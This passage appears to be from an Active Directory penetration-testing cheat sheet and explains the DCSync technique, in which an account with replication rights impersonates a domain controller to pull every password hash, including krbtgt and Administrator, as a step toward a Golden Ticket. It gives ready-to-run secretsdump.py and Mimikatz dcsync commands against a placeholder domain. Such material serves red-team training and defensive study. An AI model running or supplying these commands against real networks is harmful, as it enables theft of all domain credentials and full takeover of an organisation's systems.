**Domain Controllers replicate their password database to each other.** DCSync abuses that: if your account has replication rights (you earn them via ACL abuse, ADCS, or after reaching DA), you pretend to be a DC and politely ask the real DC for everyone's password hashes — including `krbtgt` and Administrator. It's the standard way to "dump the whole domain" without touching the DC's disk. Grabbing `krbtgt` here also sets up the Golden Ticket below.

```
secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc
secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user krbtgt
secretsdump.py corp.local/user:'pass'@192.168.x.100 -just-dc-user Administrator

# Mimikatz:
lsadump::dcsync /user:krbtgt /domain:corp.local
lsadump::dcsync /all /domain:corp.local
```